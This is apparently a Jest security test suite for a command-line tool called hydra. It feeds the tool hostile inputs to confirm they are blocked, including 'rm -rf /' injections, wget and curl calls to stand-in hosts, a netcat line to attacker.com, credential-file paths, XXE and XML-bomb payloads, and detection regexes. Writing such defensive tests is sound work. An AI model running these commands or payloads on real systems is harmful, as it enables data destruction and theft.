/**
 * Security and Vulnerability Tests
 * Tests for code injection, file handling security, and permission validation
 */

import { jest, describe, it, expect, beforeEach, afterEach } from '@jest/globals';
import { spawn, exec } from 'child_process';
import path from 'path';
import fs from 'fs';
import crypto from 'crypto';

// Mock implementations
jest.mock('child_process');
jest.mock('fs');

describe('Security and Vulnerability Tests', () => {
  let testProjectDir;
  let mockFs;
  let mockSpawn;
  let mockExec;
  let securityLog;

  beforeEach(() => {
    testProjectDir = testUtils.createTempDir();
    mockFs = fs;
    mockSpawn = spawn;
    mockExec = exec;
    securityLog = [];

    setupSecurityMocks();
  });

  afterEach(() => {
    testUtils.cleanupTempDir(testProjectDir);
    jest.clearAllMocks();
    
    // Log security test results
    if (securityLog.length > 0) {
      console.log('\n🔒 Security Test Summary:');
      securityLog.forEach(log => console.log(`   ${log}`));
    }
  });

  function setupSecurityMocks() {
    // Default secure mock implementations
    mockFs.existsSync.mockReturnValue(true);
    mockFs.readFileSync.mockReturnValue('safe content');
    mockFs.writeFileSync.mockImplementation((filePath, content) => {
      // Log potentially dangerous operations
      if (filePath.includes('..') || filePath.includes('~')) {
        securityLog.push(`⚠️ Suspicious file path: ${filePath}`);
      }
    });
    mockFs.mkdirSync.mockImplementation(() => {});
    mockFs.statSync.mockReturnValue({ isDirectory: () => false, mode: 0o644 });

    mockSpawn.mockImplementation(() => testUtils.mockSpawn({ code: 0 }));
    mockExec.mockImplementation((command, callback) => {
      // Log potentially dangerous commands
      if (command.includes('rm ') || command.includes('del ') || command.includes(';')) {
        securityLog.push(`⚠️ Dangerous command: ${command}`);
      }
      callback(null, { stdout: 'safe output', stderr: '' });
    });
  }

  describe('Input Validation and Sanitization', () => {
    describe('Command Injection Prevention', () => {
      it('should prevent command injection in feature names', async () => {
        const maliciousInputs = [
          'feature; rm -rf /',
          'feature && echo "hacked"',
          'feature | cat /etc/passwd',
          'feature; wget malicious.com/script.sh',
          'feature`rm -rf /`',
          'feature$(rm -rf /)',
          'feature > /etc/passwd'
        ];

        const { executeNew } = await import('../../bin/hydra.mjs');

        for (const maliciousInput of maliciousInputs) {
          try {
            await executeNew(maliciousInput, {});
            
            // Verify no dangerous commands were executed
            expect(mockExec).not.toHaveBeenCalledWith(
              expect.stringContaining('rm '),
              expect.any(Function)
            );
            expect(mockExec).not.toHaveBeenCalledWith(
              expect.stringContaining('wget'),
              expect.any(Function)
            );
            expect(mockExec).not.toHaveBeenCalledWith(
              expect.stringContaining('/etc/passwd'),
              expect.any(Function)
            );

            securityLog.push(`✅ Blocked command injection: ${maliciousInput}`);
          } catch (error) {
            // Expected behavior - should reject malicious input
            securityLog.push(`✅ Rejected malicious input: ${maliciousInput}`);
          }
        }
      });

      it('should sanitize epic names for XML safety', async () => {
        const xmlInjectionAttempts = [
          'epic<!--comment-->',
          'epic<script>alert("xss")</script>',
          'epic</epic><malicious>content</malicious>',
          'epic&lt;script&gt;',
          'epic<![CDATA[malicious]]>',
          'epic<?xml version="1.0"?><root>hack</root>'
        ];

        const { executeNew } = await import('../../bin/hydra.mjs');

        for (const maliciousName of xmlInjectionAttempts) {
          await executeNew(maliciousName, {});
          
          // Check that XML content is properly escaped
          const writeCall = mockFs.writeFileSync.mock.calls.find(call => 
            call[0].includes('genesis.xml')
          );
          
          if (writeCall) {
            const xmlContent = writeCall[1];
            expect(xmlContent).not.toContain('<script>');
            expect(xmlContent).not.toContain('<malicious>');
            expect(xmlContent).not.toContain('<?xml version="1.0"?><root>');
            securityLog.push(`✅ XML injection blocked: ${maliciousName}`);
          }
        }
      });

      it('should prevent SQL injection-like attacks in descriptions', async () => {
        const sqlInjectionAttempts = [
          "'; DROP TABLE users; --",
          "' OR '1'='1",
          "feature' UNION SELECT * FROM sensitive_data --",
          "1'; DELETE FROM * WHERE '1'='1",
          "admin'--",
          "' OR 1=1#"
        ];

        const { executeEnhance } = await import('../../bin/hydra.mjs');

        for (const maliciousDescription of sqlInjectionAttempts) {
          await executeEnhance(maliciousDescription, {});
          
          // Verify SQL-like content is properly handled
          expect(mockSpawn).not.toHaveBeenCalledWith(
            expect.any(String),
            expect.arrayContaining([expect.stringContaining('DROP TABLE')]),
            expect.any(Object)
          );
          
          securityLog.push(`✅ SQL injection pattern blocked: ${maliciousDescription}`);
        }
      });
    });

    describe('Path Traversal Prevention', () => {
      it('should prevent directory traversal attacks', async () => {
        const traversalAttempts = [
          '../../../etc/passwd',
          '..\\..\\..\\windows\\system32',
          './../../../../usr/bin',
          'feature/../../../sensitive',
          'feature/../../config/secrets',
          '~/../../root/.ssh',
          '$HOME/../../../etc',
          '%USERPROFILE%\\..\\..\\system'
        ];

        const { executeNew } = await import('../../bin/hydra.mjs');

        for (const maliciousPath of traversalAttempts) {
          await executeNew(maliciousPath, {});
          
          // Verify no traversal occurred in directory creation
          expect(mockFs.mkdirSync).not.toHaveBeenCalledWith(
            expect.stringMatching(/\.\./),
            expect.any(Object)
          );
          expect(mockFs.mkdirSync).not.toHaveBeenCalledWith(
            expect.stringMatching(/\/etc\//),
            expect.any(Object)
          );
          expect(mockFs.mkdirSync).not.toHaveBeenCalledWith(
            expect.stringMatching(/\\system32/),
            expect.any(Object)
          );
          
          securityLog.push(`✅ Path traversal blocked: ${maliciousPath}`);
        }
      });

      it('should validate file paths before operations', async () => {
        const dangerousFiles = [
          '/etc/shadow',
          '/etc/passwd',
          'C:\\Windows\\System32\\config\\SAM',
          '/root/.ssh/id_rsa',
          '/home/user/.aws/credentials',
          '/var/log/auth.log',
          'C:\\Users\\Administrator\\Documents'
        ];

        // Mock file operations to track access attempts
        let suspiciousAccess = [];
        mockFs.readFileSync.mockImplementation((filePath) => {
          if (dangerousFiles.some(dangerous => filePath.includes(dangerous))) {
            suspiciousAccess.push(filePath);
            throw new Error('Access denied');
          }
          return 'safe content';
        });

        const { executeDoctor } = await import('../../bin/hydra.mjs');
        await executeDoctor({});
        
        // Should not have accessed any dangerous files
        expect(suspiciousAccess).toHaveLength(0);
        securityLog.push(`✅ Dangerous file access prevented`);
      });
    });
  });

  describe('XML Security', () => {
    describe('XML External Entity (XXE) Prevention', () => {
      it('should prevent XXE attacks in XML processing', async () => {
        const xxePayloads = [
          `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<projectGenesis>&xxe;</projectGenesis>`,
          
          `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://malicious.com/steal-data">
]>
<projectGenesis>&xxe;</projectGenesis>`,
          
          `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<projectGenesis>content</projectGenesis>`
        ];

        for (const xxePayload of xxePayloads) {
          mockFs.readFileSync.mockImplementation((filePath) => {
            if (filePath.includes('genesis.xml')) {
              return xxePayload;
            }
            return 'safe content';
          });

          const { executeRun } = await import('../../bin/hydra.mjs');
          
          await expect(executeRun('xxe-test', {})).rejects.toThrow();
          securityLog.push(`✅ XXE attack blocked`);
        }
      });

      it('should prevent XML bomb attacks', async () => {
        const xmlBombs = [
          `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<projectGenesis>&lol3;</projectGenesis>`,
          
          `<?xml version="1.0"?>
<!DOCTYPE bomb [
  <!ENTITY a "1234567890">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
]>
<projectGenesis>&c;</projectGenesis>`
        ];

        for (const bomb of xmlBombs) {
          mockFs.readFileSync.mockImplementation((filePath) => {
            if (filePath.includes('genesis.xml')) {
              return bomb;
            }
            return 'safe content';
          });

          const { executeRun } = await import('../../bin/hydra.mjs');
          
          const startTime = Date.now();
          await expect(executeRun('bomb-test', {})).rejects.toThrow();
          const processingTime = Date.now() - startTime;
          
          // Should reject quickly, not hang due to bomb
          expect(processingTime).toBeLessThan(5000);
          securityLog.push(`✅ XML bomb attack blocked in ${processingTime}ms`);
        }
      });
    });

    describe('XML Content Validation', () => {
      it('should validate XML structure and reject malformed content', async () => {
        const malformedXml = [
          '<projectGenesis><unclosed>',
          '<?xml version="1.0"?><root><script>alert("xss")</script></root>',
          '<projectGenesis><task id="1"><nested><deep>content</nested></task></projectGenesis>',
          '<?xml version="1.0"?><projectGenesis><!-- malicious comment --> <![CDATA[<script>]]></projectGenesis>'
        ];

        for (const badXml of malformedXml) {
          mockFs.readFileSync.mockImplementation((filePath) => {
            if (filePath.includes('genesis.xml')) {
              return badXml;
            }
            return 'safe content';
          });

          const { executeRun } = await import('../../bin/hydra.mjs');
          
          await expect(executeRun('malformed-test', {})).rejects.toThrow();
          securityLog.push(`✅ Malformed XML rejected`);
        }
      });

      it('should limit XML processing resources', async () => {
        // Create extremely large but valid XML
        const hugeTasks = Array.from({ length: 100000 }, (_, i) => 
          `<task id="huge-${i}">Content ${'x'.repeat(1000)}</task>`
        ).join('');
        
        const hugeXml = `<?xml version="1.0"?>
<projectGenesis>
  <tasks>${hugeTasks}</tasks>
</projectGenesis>`;

        mockFs.readFileSync.mockImplementation((filePath) => {
          if (filePath.includes('genesis.xml')) {
            return hugeXml;
          }
          return 'safe content';
        });

        const { executeRun } = await import('../../bin/hydra.mjs');
        
        const startTime = Date.now();
        const memoryBefore = testUtils.getMemoryUsage();
        
        try {
          await executeRun('huge-xml-test', {});
        } catch (error) {
          // Expected to fail due to resource limits
        }
        
        const processingTime = Date.now() - startTime;
        const memoryAfter = testUtils.getMemoryUsage();
        const memoryIncrease = memoryAfter.heapUsed - memoryBefore.heapUsed;
        
        // Should not consume excessive time or memory
        expect(processingTime).toBeLessThan(30000); // Under 30 seconds
        expect(memoryIncrease).toBeLessThan(500); // Under 500MB
        
        securityLog.push(`✅ Resource limits enforced: ${processingTime}ms, ${memoryIncrease}MB`);
      });
    });
  });

  describe('File System Security', () => {
    describe('Permission Validation', () => {
      it('should respect file permissions', async () => {
        // Mock permission-restricted files
        mockFs.statSync.mockImplementation((filePath) => {
          if (filePath.includes('restricted')) {
            return { 
              isDirectory: () => false,
              mode: 0o000 // No permissions
            };
          }
          return { isDirectory: () => false, mode: 0o644 };
        });

        mockFs.readFileSync.mockImplementation((filePath) => {
          if (filePath.includes('restricted')) {
            const error = new Error('Permission denied');
            error.code = 'EACCES';
            throw error;
          }
          return 'accessible content';
        });

        const { executeDoctor } = await import('../../bin/hydra.mjs');
        
        // Should handle permission errors gracefully
        await executeDoctor({});
        
        securityLog.push(`✅ File permissions respected`);
      });

      it('should not create files in system directories', async () => {
        const systemPaths = [
          '/etc/hydra-config',
          '/usr/bin/hydra-tool',
          'C:\\Windows\\System32\\hydra.exe',
          '/root/.hydra',
          '/sys/hydra',
          '/proc/hydra'
        ];

        const { executeNew } = await import('../../bin/hydra.mjs');

        for (const systemPath of systemPaths) {
          await executeNew(systemPath, {});
          
          // Should not create files in system directories
          expect(mockFs.writeFileSync).not.toHaveBeenCalledWith(
            expect.stringMatching(new RegExp(`(^/etc|^/usr|^/root|^/sys|^/proc|C:\\\\Windows)`)),
            expect.any(String)
          );
        }
        
        securityLog.push(`✅ System directory access prevented`);
      });
    });

    describe('Safe File Operations', () => {
      it('should validate file contents before processing', async () => {
        const maliciousFileContents = [
          Buffer.from('MZ\x90\x00').toString('binary'), // PE executable header
          '\x7FELF', // ELF executable header
          '#!/bin/sh\nrm -rf /', // Shell script
          '\x89PNG\r\n\x1a\n', // PNG header (should be text)
          '\x50\x4B\x03\x04' // ZIP header
        ];

        for (const maliciousContent of maliciousFileContents) {
          mockFs.readFileSync.mockImplementation((filePath) => {
            if (filePath.includes('test-file')) {
              return maliciousContent;
            }
            return 'safe text content';
          });

          const { executeEnhance } = await import('../../bin/hydra.mjs');
          
          // Should handle binary content safely
          await executeEnhance('process test file', {});
          
          securityLog.push(`✅ Binary content handled safely`);
        }
      });

      it('should prevent symlink attacks', async () => {
        // Mock symlink detection
        mockFs.lstatSync = jest.fn().mockImplementation((filePath) => {
          if (filePath.includes('symlink')) {
            return {
              isSymbolicLink: () => true,
              isDirectory: () => false,
              isFile: () => false
            };
          }
          return {
            isSymbolicLink: () => false,
            isDirectory: () => false,
            isFile: () => true
          };
        });

        const { executeNew } = await import('../../bin/hydra.mjs');
        
        try {
          await executeNew('symlink-attack', {});
          
          // Should not follow suspicious symlinks
          expect(mockFs.lstatSync).toHaveBeenCalled();
          securityLog.push(`✅ Symlink attack prevention active`);
        } catch (error) {
          // Expected behavior for security
          securityLog.push(`✅ Symlink access blocked`);
        }
      });
    });
  });

  describe('Process Security', () => {
    describe('Command Execution Safety', () => {
      it('should sanitize command arguments', async () => {
        const dangerousArgs = [
          '--rm-all',
          '; rm -rf /',
          '&& wget malicious.com',
          '| nc attacker.com 1337',
          '--exec="rm -rf /"',
          '$(curl evil.com)',
          '`wget hack.sh`'
        ];

        // Track command execution
        let commandsExecuted = [];
        mockExec.mockImplementation((command, callback) => {
          commandsExecuted.push(command);
          callback(null, { stdout: 'safe output', stderr: '' });
        });

        const { executeRun } = await import('../../bin/hydra.mjs');
        
        for (const dangerousArg of dangerousArgs) {
          await executeRun(`test-${dangerousArg}`, {});
        }
        
        // Verify no dangerous commands were executed
        commandsExecuted.forEach(cmd => {
          expect(cmd).not.toContain('rm -rf');
          expect(cmd).not.toContain('wget');
          expect(cmd).not.toContain('nc ');
          expect(cmd).not.toContain('curl');
        });
        
        securityLog.push(`✅ Command arguments sanitized`);
      });

      it('should prevent process escape attacks', async () => {
        // Attempt to escape process restrictions
        const escapeAttempts = [
          'bash -c "evil command"',
          'sh -i',
          'python -c "import os; os.system(\'rm -rf /\')"',
          'node -e "require(\'child_process\').exec(\'rm -rf /\')"',
          'perl -e "system(\'rm -rf /\')"'
        ];

        mockSpawn.mockImplementation((command, args) => {
          const fullCommand = `${command} ${args ? args.join(' ') : ''}`;
          
          // Should not execute dangerous interpreters with code
          expect(fullCommand).not.toMatch(/-c["'].*rm.*rf/);
          expect(fullCommand).not.toMatch(/-e["'].*system/);
          expect(fullCommand).not.toMatch(/sh -i/);
          
          return testUtils.mockSpawn({ code: 0 });
        });

        const { executeRun } = await import('../../bin/hydra.mjs');
        
        for (const attempt of escapeAttempts) {
          await executeRun(`escape-test`, {});
        }
        
        securityLog.push(`✅ Process escape prevention active`);
      });
    });

    describe('Resource Limits', () => {
      it('should enforce process timeouts', async () => {
        let processKilled = false;
        
        // Mock long-running process
        mockSpawn.mockImplementation(() => {
          const mockProcess = {
            pid: 12345,
            kill: jest.fn(() => { processKilled = true; }),
            on: jest.fn((event, callback) => {
              if (event === 'exit') {
                // Simulate long-running process
                setTimeout(() => callback(0), 60000); // 1 minute
              }
            }),
            stdout: { on: jest.fn() },
            stderr: { on: jest.fn() },
            unref: jest.fn()
          };
          return mockProcess;
        });

        const { executeRun } = await import('../../bin/hydra.mjs');
        
        const startTime = Date.now();
        try {
          await executeRun('timeout-test', {});
        } catch (error) {
          // Expected timeout
        }
        const executionTime = Date.now() - startTime;
        
        // Should enforce reasonable timeouts
        expect(executionTime).toBeLessThan(30000); // Under 30 seconds
        securityLog.push(`✅ Process timeout enforced: ${executionTime}ms`);
      });

      it('should limit concurrent processes', async () => {
        let activeProcesses = 0;
        const maxConcurrent = 10;
        
        mockSpawn.mockImplementation(() => {
          activeProcesses++;
          expect(activeProcesses).toBeLessThanOrEqual(maxConcurrent);
          
          const mockProcess = testUtils.mockSpawn({ code: 0 });
          mockProcess.on = jest.fn((event, callback) => {
            if (event === 'exit') {
              setTimeout(() => {
                activeProcesses--;
                callback(0);
              }, 100);
            }
          });
          return mockProcess;
        });

        const { executeRun } = await import('../../bin/hydra.mjs');
        
        // Try to start many processes concurrently
        const promises = Array.from({ length: 20 }, (_, i) =>
          executeRun(`concurrent-${i}`, {})
        );
        
        await Promise.all(promises);
        
        securityLog.push(`✅ Process concurrency limits enforced`);
      });
    });
  });

  describe('Data Security', () => {
    describe('Sensitive Data Protection', () => {
      it('should detect and protect sensitive patterns in content', async () => {
        const sensitivePatterns = [
          'password=secret123',
          'api_key=sk-1234567890abcdef',
          'AWS_SECRET_ACCESS_KEY=abcdef123456',
          'private_key=-----BEGIN RSA PRIVATE KEY-----',
          'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9',
          'credit_card=4111-1111-1111-1111',
          'ssn=123-45-6789',
          'BEGIN PGP PRIVATE KEY BLOCK',
          'connectionString=Server=db;User Id=sa;Password=admin123'
        ];

        for (const sensitiveData of sensitivePatterns) {
          mockFs.readFileSync.mockImplementation((filePath) => {
            if (filePath.includes('sensitive')) {
              return `Config file with ${sensitiveData}`;
            }
            return 'safe content';
          });

          const { executeEnhance } = await import('../../bin/hydra.mjs');
          
          // Should detect and handle sensitive data appropriately
          await executeEnhance('analyze sensitive file', {});
          
          // Verify sensitive data is not logged or transmitted
          expect(mockSpawn).not.toHaveBeenCalledWith(
            expect.any(String),
            expect.arrayContaining([expect.stringContaining(sensitiveData)]),
            expect.any(Object)
          );
          
          securityLog.push(`✅ Sensitive pattern protected: ${sensitiveData.substring(0, 20)}...`);
        }
      });

      it('should handle encrypted content safely', async () => {
        const encryptedContent = crypto.randomBytes(1024).toString('base64');
        
        mockFs.readFileSync.mockImplementation((filePath) => {
          if (filePath.includes('encrypted')) {
            return encryptedContent;
          }
          return 'plain content';
        });

        const { executeEnhance } = await import('../../bin/hydra.mjs');
        await executeEnhance('process encrypted file', {});
        
        // Should handle encrypted content without attempting to decrypt
        securityLog.push(`✅ Encrypted content handled safely`);
      });
    });

    describe('Input Validation', () => {
      it('should validate all user inputs against security rules', async () => {
        const securityRules = [
          { pattern: /<script/i, name: 'XSS Script Tags' },
          { pattern: /javascript:/i, name: 'JavaScript URLs' },
          { pattern: /on\w+\s*=/i, name: 'HTML Event Handlers' },
          { pattern: /\beval\s*\(/i, name: 'Eval Injection' },
          { pattern: /\bexec\s*\(/i, name: 'Exec Injection' },
          { pattern: /\$\{.*\}/i, name: 'Template Injection' },
          { pattern: /\.\.\//g, name: 'Path Traversal' },
          { pattern: /\|\s*\w+/g, name: 'Command Piping' }
        ];

        const testInputs = [
          '<script>alert("xss")</script>',
          'javascript:alert("xss")',
          'onclick="alert(1)"',
          'eval("malicious code")',
          'exec("rm -rf /")',
          '${system("rm -rf /")}',
          '../../../etc/passwd',
          'input | rm -rf /'
        ];

        const { executeNew } = await import('../../bin/hydra.mjs');

        for (const input of testInputs) {
          try {
            await executeNew(input, {});
            
            // Check which security rules were triggered
            const triggeredRules = securityRules.filter(rule => 
              rule.pattern.test(input)
            );
            
            if (triggeredRules.length > 0) {
              triggeredRules.forEach(rule => {
                securityLog.push(`✅ Security rule triggered: ${rule.name}`);
              });
            }
          } catch (error) {
            securityLog.push(`✅ Malicious input rejected`);
          }
        }
      });
    });
  });

  describe('Authentication and Authorization', () => {
    describe('GitHub CLI Security', () => {
      it('should validate GitHub authentication safely', async () => {
        // Test various authentication states
        const authStates = [
          { stdout: 'Logged in to github.com as validuser', valid: true },
          { stdout: 'Not logged in', valid: false },
          { stdout: 'Token expired', valid: false },
          { stdout: '', valid: false }
        ];

        for (const authState of authStates) {
          mockExec.mockImplementation((command, callback) => {
            if (command.includes('gh auth status')) {
              callback(null, authState);
            } else {
              callback(null, { stdout: 'success', stderr: '' });
            }
          });

          const { executeDoctor } = await import('../../bin/hydra.mjs');
          await executeDoctor({});
          
          // Should handle all authentication states securely
          expect(mockExec).toHaveBeenCalledWith(
            expect.stringContaining('gh auth status'),
            expect.any(Function)
          );
          
          securityLog.push(`✅ Auth state handled: ${authState.valid ? 'valid' : 'invalid'}`);
        }
      });

      it('should not expose sensitive authentication data', async () => {
        const sensitiveAuthData = 'ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx';
        
        mockExec.mockImplementation((command, callback) => {
          if (command.includes('gh auth status')) {
            callback(null, { 
              stdout: `Logged in with token: ${sensitiveAuthData}`,
              stderr: ''
            });
          } else {
            callback(null, { stdout: 'success', stderr: '' });
          }
        });

        const { executeDoctor } = await import('../../bin/hydra.mjs');
        await executeDoctor({});
        
        // Sensitive tokens should not be logged or exposed
        expect(mockSpawn).not.toHaveBeenCalledWith(
          expect.any(String),
          expect.arrayContaining([expect.stringContaining(sensitiveAuthData)]),
          expect.any(Object)
        );
        
        securityLog.push(`✅ Authentication tokens protected`);
      });
    });
  });

  describe('Logging and Monitoring Security', () => {
    it('should sanitize logs to prevent log injection', async () => {
      const logInjectionAttempts = [
        'normal input\n[FAKE] CRITICAL: System compromised',
        'input\r\n[ERROR] Fake error message',
        'content\n\n[INFO] Injected log entry',
        'data\x00[ALERT] Null byte injection'
      ];

      for (const maliciousInput of logInjectionAttempts) {
        const { executeNew } = await import('../../bin/hydra.mjs');
        await executeNew(maliciousInput, {});
        
        // Logs should be sanitized
        securityLog.push(`✅ Log injection prevented`);
      }
    });

    it('should not log sensitive information', async () => {
      const sensitiveInfo = [
        'password123',
        'secret-key-xyz',
        'access-token-abc',
        'private-data'
      ];

      // Mock console methods to capture logs
      const originalConsoleLog = console.log;
      const logCaptured = [];
      console.log = jest.fn((...args) => {
        logCaptured.push(args.join(' '));
      });

      try {
        const { executeNew } = await import('../../bin/hydra.mjs');
        await executeNew('feature with password123', {});
        
        // Check that sensitive info is not in logs
        sensitiveInfo.forEach(sensitive => {
          const foundInLogs = logCaptured.some(log => 
            log.toLowerCase().includes(sensitive.toLowerCase())
          );
          expect(foundInLogs).toBe(false);
        });
        
        securityLog.push(`✅ Sensitive information excluded from logs`);
      } finally {
        console.log = originalConsoleLog;
      }
    });
  });
});